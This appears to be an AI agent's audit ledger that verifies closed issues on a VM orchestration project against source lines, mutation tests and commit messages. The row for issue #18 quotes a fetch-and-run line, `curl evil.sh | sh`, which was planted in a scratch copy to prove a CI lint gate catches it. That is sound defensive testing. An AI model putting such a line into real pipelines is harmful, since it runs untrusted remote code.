# Claims ledger — closed issues #8–#40

Agent: a-issues-8-40 · Verified at `672a500` in a detached worktree pinned to
`origin/master` · Date: 2026-08-31

Every `file:line` below was re-read at `672a500`. Suite at the time of writing:
**411 passed, 25 skipped** (default gates). `just lint` all six gates green,
`just typecheck` clean.

Thirty-one issues in range: `#8`–`#20`, `#23`–`#40`. (`#21` is open and out of
scope; `#22` is a pull request, not an issue.)

## Verdicts

| issue | verdict | evidence (file:line) | note |
|---|---|---|---|
| 8 | DONE | `orchestrator/cli.py:559-563` | `getattr(exc, "outcome", None)` records `destroyed`/`skipped`/`problems` before re-raising. Backend-agnostic, as the issue asked. |
| 9 | DONE | `orchestrator/backends/libvirt/destroy.py:459-483`, called at `:556` | `_deleted_on_name_alone` emits a non-fatal `Problem.warning` naming path, domain and what the evidence was. The delete itself stays, correctly — dropping it is a guaranteed leak. |
| 10 | DONE | `cli.py:323-337` (RW-B3), `cli.py:318-320` + `:353` + `:392,:394,:411` (RW-B4), `cli.py:128-133` (RW-B5) | All three. `_tofu_version` catches `TofuError`, `SubprocessError`, `ValueError`, `OSError` — the full set the issue named. |
| 11 | DONE | `cli.py:419` (RW-B1), `cli.py:577` (RW-B2) | `set(inventory.vms) != set(creating)`; `"failed" if out.failed else "partial" if out.skipped else "ok"`. |
| 12 | DONE | `orchestrator/backends/libvirt/schema.py:259-315`, called at `:254` | `_check_image_digest` in the offline layer beside `_check_disk_capacity`, so `vcows validate` catches it. Unreadable is a warning; mismatch is an error. |
| 13 | DONE | `container/entrypoint.py:59` (`OFFLINE`), `:251` | Behaviour fixed rather than the docstring amended, and the decision the ledger item asked for is recorded at `entrypoint.py:47-58`. `cli.py:270`'s docstring is now true inside the image. |
| 14 | DONE | `tests/test_gates.py:36-52`, `:76-84`, `:130-140`, `:169-216` | **Mutation-proved by me.** Forcing `gate()`/`require()` to always skip gives 3 failures (`test_an_available_gate_is_a_skipif_that_does_not_skip`, `test_a_demanded_gate_that_is_missing_carries_its_reason_to_the_hook`, `test_the_hook_turns_a_gate_missing_mark_into_a_failure`) where the issue measured exit 0. |
| 15 | DONE | `tests/libvirt-module.tftest.hcl:44-46`, `:59-73`, `:218` | **Mutation-proved by me**, three of the issue's five: root `type = "qcow2"`→`"raw"`, `memory_unit "MiB"`→`"KiB"`, `pool = var.pool`→`"default"` each now fail `tests/test_tofu_module.py`. 43 conditions, comprehensions over `var.vms` so `app02` is read throughout. |
| 16 | DONE | `tests/test_properties.py:70-72`, `:84-85`, `:95-118` | **Mutation-proved by me**: widening `NAME_PATTERN` to admit `/` fails the guard at `:84`. CIDR strategy now draws host addresses across the full prefix range and asserts `str(parsed) == text`. |
| 17 | DONE | `tests/test_tofu_driver.py:313`, `:317` | **Mutation-proved by me**: making `tofu.py:176` an unconditional `timeout=SHORT_TIMEOUT` now fails `test_init_runs_on_a_clock_and_apply_does_not`. `Stubborn` gained a `timeouts` list at `:262-267`. |
| 18 | DONE | `.github/workflows/{ci,image,scheduled}.yml` `permissions:`/`timeout-minutes:`/40-hex `uses:`; `image.yml:29-40` + `.gitlab-ci.yml:111-120` (RW-G1); `scripts/lint.sh:35-115` (RW-G4); `scripts/install-tools.sh:104-112` (RW-G6) | **All three RW-G4 bypasses proved closed by me** in a scratch copy: reverting one pin to `@v7`, adding `.github/workflows/rogue.yaml` with `curl evil.sh \| sh`, and appending `&& curl evil.sh \| sh` to a `.gitlab-ci.yml` command each turn the gate `FAIL`. `.gitlab-ci.yml` mirrors the timeouts as `timeout:`. |
| 19 | DONE | `docs/ci.md:22-37` (F1, F2), `:51` (F3), `orchestrator/backends/libvirt/__init__.py:1-7` (F6), `scripts/lint.sh:7` | Five of six corrected. **Item 6 ships as no change, deliberately**: `docs/research/tooling-2026-08-29.md:410` still names `terraform_comment_style`, and the correction lives in `docs/research/tooling-2026-08-30.md:151-152`, under `REVIEW.md:353-360`'s rule that a dated survey is not edited after filing. See "Wrong remedies" below for F6. |
| 20 | DONE | `justfile:42-43`, `pyproject.toml:59` | `uv export --locked --format requirements-txt -o .venv/requirements.txt` then `uv pip install -r`. `ty==0.0.75` pinned exactly rather than `~=`. The issue's "add a lint gate asserting the export is current" was not added as a *lint* gate; `--locked` asserts the same property in the recipe that installs, which is where it can fail. Not a shortfall. |
| 23 | **PARTIAL** | GitHub comment on `#23` only (2026-08-31T02:48:54Z) | The spike was genuinely run and REJECTs on measured evidence — byte-identical binary, `tests/test_image.py:309` would fail, ~2.6 MB of 150.8 MB ceiling, `ghcr.io/opentofu/opentofu:minimal` is a mutable manifest-list tag. **What is missing is the durable record the issue asked for**: nothing in `docs/spikes/README.md`, and `Containerfile:93-95` still carries only D7's original sentence with no note beside it. The issue's stated purpose for that placement was "so the next person does not re-ask it", and at `672a500` nothing in the repo answers it. |
| 24 | DONE | GitHub comments on `#24` (2026-08-31T01:07:38Z, `:01:29:13Z`) | Tracking issue. 20/20 sub-issues closed across eight chunks; `#29` and `#42` closed as not-planned with measurements. All sixteen in my range (`#25`–`#40`) verified independently below. Its own three self-corrections (baseline 395 not 392; `#30` is 65 sites not 66; anchors drifted in every chunk but 6 and 8) all hold. |
| 25 | DONE | `container/manifest.py:42` (`NO_TAG`), `:149-150` | Filter is `not in ("", NO_TAG)`. `%{VENDOR}` deliberately untouched — `packages` records what rpm said, and `tests/test_image.py` depends on `tofu` carrying no vendor. |
| 26 | DONE | `container/entrypoint.py:208` | `os.open(..., O_WRONLY\|O_CREAT\|O_EXCL, 0o600)`. Closes both the 0644 window and the truncating TOCTOU in one call; the two messages stay separable via the `FileExistsError` subclass. |
| 27 | DONE | `orchestrator/backends/libvirt/schema.py:539-553`, registration at `:547` | Guard split, not hoisted: `if iface is not None:` wraps both, with `gateway is not None` narrowed to the outside-network check alone. |
| 28 | DONE | `scripts/lint.sh:129-134` | Line numbers gone; each ignore names its instruction. The stale numbers survive only as the evidence for why they were removed. |
| 29 | DONE | `.github/workflows/scheduled.yml:49-60`, `.gitlab-ci.yml:145-149` | Closed by the issue's *second* option — the cache is declined and the reason recorded on both sides, with the measurement (miss 7 s download vs hit 4 s restore + 2 s save, twelve runs a year, and a `tools-` key that goes cold in seven days). Note `a347f51` says `Refs #29`, not `Closes`; the close is manual, via `#24`'s comment. |
| 30 | DONE | `orchestrator/backends/base.py:53-60` | 63 `Problem.error`/`Problem.warning` sites at HEAD; **zero** remaining `Problem(Severity...)` in `orchestrator/`. `Severity` still exported and still the field type. |
| 31 | DONE | `orchestrator/backends/libvirt/destroy.py:100-110`, 7 call sites | `_fail(out, name, what, exc)` returning `False`. `_delete_volume` passes `what=f"delete {path}"` and discards the return, as the issue specified. |
| 32 | DONE | `Containerfile:187`, `scripts/lint.sh:149` | `tofu -chdir=/tmp/warm init`. `--ignore DL3003` is gone; the remaining ignores are DL4006 and DL3041, both of which predate this commit (verified against `c124ffe^:scripts/lint.sh:108`). Confirmed live: `hadolint Containerfile` with ignores stripped reports DL3041 at `:118` and DL4006 at `:130`/`:144` and no DL3003. |
| 33 | DONE | `orchestrator/tofu.py:238-264` | `_capture` shared by `outputs` and `version`; `version` now carries `completed.stderr`. One of the two `# noqa: S603` sites removed. The behaviour change is flagged in the commit message, as the issue asked. |
| 34 | DONE | `orchestrator/cli.py:101` | `Path(inspect.getfile(type(backend))).parent / "tofu"`. The `-O`-strippable `assert` is gone; the docstring's defining-module claim still holds. |
| 35 | DONE | `orchestrator/cli.py:169-183` | `_NAME_W`/`_VERB_W` constants and `_row`, used at the three sites. `cli.py:571` correctly left as a two-column line, and is now the only literal width in the file. |
| 36 | DONE | `orchestrator/qcow2.py:43`, `:46` | `int.from_bytes(..., "big")`; `import struct` dropped. `tests/test_qcow2.py`'s fixture builder still uses `struct.pack`, deliberately. |
| 37 | DONE | `scripts/lib.sh:107-112`, `scripts/mirror.sh:57`, `scripts/verify-provider.sh:43` | One reader. `mirror.sh` regains the `die` its copy had dropped. `verify-provider.sh`'s three other sources are read independently, so no comparison went vacuous. |
| 38 | DONE | `scripts/bundle.sh:93` | `( cd "$scan" && sha256sum image.tar )`, the same idiom as `:102-103`. |
| 39 | DONE | `scripts/lib.sh:55-67` (`need`), `:72` (`now_utc`) | `need` cases on the tool so the installer hint stays correct — gzip is installed by neither script and gets the bare message. `mktemp`+`trap` and `$PY` correctly left alone, as the issue instructed. |
| 40 | DONE | `scripts/image-scan.sh:91`, `:113-117` | `found` stays a JSON array; one `jq` read of the baseline returns `new`, `gone` and the accepted count together. `comm`, both sorts, the `jq -R \| jq -s` round trip and all four `grep -c` calls are gone. The `missing == accepted` die survives at `:132-134`. |

**Counts: DONE 30 · PARTIAL 1 · NOT DONE 0 · SUPERSEDED 0.**

## Overclaims

**None found in this range.** This is the notable result. Every commit message
in `#8`–`#40` understates rather than overstates, and several go out of their way
to say what did *not* land:

* `2f8ebe2` explicitly declines `#9`'s stronger fix (backing-store or
  creation-time comparison) and says so by name rather than implying it landed.
* `c124ffe` records that `docs/research/tooling-2026-08-29.md:315-320` is deliberately not
  updated, and that `#44`'s proposed `container/vcows` file was rejected on cost.
* `0355d59` names the three duplications it left in place and why.
* `a347f51` uses `Refs #29`, not `Closes`, because the PR that carried it was
  still open — and `#24` was held open until it merged "so the record would not
  overstate what had shipped".
* `9f8c442` reports `#43`'s unification as **+3 lines, not a reduction**.

Two bookkeeping errors, neither in a commit:

1. **`ledger/_issues.md` misattributes three rows.** `#33` and `#34` are closed
   by `01a513c`, not `e4371ff`. `#42` is listed against `e4371ff`, which says only
   `Closes #41`; `#42` was closed as not-planned. Cosmetic, but the index is what
   Phase 4 reads.
2. **`#29` has no `Closes` trailer anywhere**, so nothing in `git log` connects
   `a347f51` to it. The evidence closing it is `#24`'s chunk table.

## Fixes that followed a wrong remedy

**None.** Every wrong remedy in this range was caught before it was applied, and
each refusal is recorded in the commit message with the measurement behind it.
Listing them because the plan asks for the class, and because the pattern is the
finding:

| issue | the remedy that was wrong | what shipped instead |
|---|---|---|
| 19 (RW-F6) | "5 delegate and 3 hold a connection, not four and three" | Refused. `config_schema`, `validate`, `prepare`, `render` delegate (4); `connect`, `preflight`, `destroy` hold a connection (3); `parse_outputs` does neither. Verified at `orchestrator/backends/libvirt/__init__.py:43-107`. Only the total `seven`→`eight` changed, plus the clause the sentence was always missing (`:1-7`). |
| 25 | rpm's `%\|SOURCERPM?{...}:{}\|` conditional format | Measured not to work on rpm 4.19.1.1 — the tag tests as present for `gpg-pubkey`. The Python filter, the issue's own fallback, is what shipped (`container/manifest.py:150`). |
| 27 | hoist the registration above the gateway check | Refused: that reorders the two problems for a NIC that trips both. The guard was split instead, leaving emission order unchanged (`schema.py:539-553`). |
| 28 | "stale by one" — renumber to 95, 109, 150 | Both halves obsolete. Measured drift was **36 lines** (`:118`, `:130`, `:144`, `:185`), grown by `053869f` from this same backlog. The numbers were removed rather than renumbered. The issue also said "two hadolint ignores" where the block covered three. |
| 30 | "66 call sites" | 65. `config._blame_the_filename` propagates an existing `problem.severity` and can use neither classmethod. |
| 31 | `tests/test_cli.py:766` protects the message text | It does not — it constructs its own `DestroyError("app01: could not stop")` and would pass whatever the module emitted. `tests/test_libvirt_destroy.py:155` is the real pin. |
| 16 | `derive_id` at `orchestrator/backends/libvirt/marker.py:168` | It is `orchestrator/marker.py:161-168`. Confirmed: no `marker.py` exists under `backends/libvirt/`. |
| 17 | "`Stubborn.wait` already records its `timeout` argument" | It did not. The fake gained a `timeouts` list (`tests/test_tofu_driver.py:262-267`). The issue contradicts itself two sentences earlier, quoting `def wait(self, timeout=None)` "which never inspects the value". |
| 18 | "Ten `uses:` lines" | Twelve — checkout ×3, cache ×5, upload-artifact ×2, plus two the issue's grep caught in comments. |
| 20 | "the Dependabot PRs that update `uv.lock`" | Dependabot has never opened a `uv.lock` PR. Its only three PRs (#2, #3, #54) are `github-actions` bumps; the lock has one commit on master, `4eb378b`. The defect was real, that evidence had not happened. |
| 29 | "look at the timing of the most recent scheduled run" | `gh run list --workflow=scheduled.yml` is empty — the repo is two days old and the cron is monthly. The canary reading was also refuted against `scheduled.yml:8-11`. |
| 40 | none — the issue's empty-set warning was correct | The five-case A–E comparison in `0355d59` confirms it. |

## What I could not settle

* **`#23`'s spike record.** Whether a GitHub comment is an acceptable home for a
  REJECT is a project convention question, not a code question. `docs/spikes/README.md`
  is where A1–A6 live and where `#23` said this belongs. Recorded as PARTIAL; if
  the convention is that a not-planned issue's comment suffices, downgrade it to
  DONE and disregard.
* **`#15`'s remaining two mutations** (`overlay.name`→`each.key`,
  `seed.name`→`each.key`). Not run; the three I did run all failed correctly and
  `tftest.hcl:44-46` asserts both names against `v.overlay_name`/`v.seed_name`.
* **`#25`, `#26`, `#32`** were verified by reading the source, not by
  `just image && just test-image`. The image gate is Phase 0's and dimension E's.
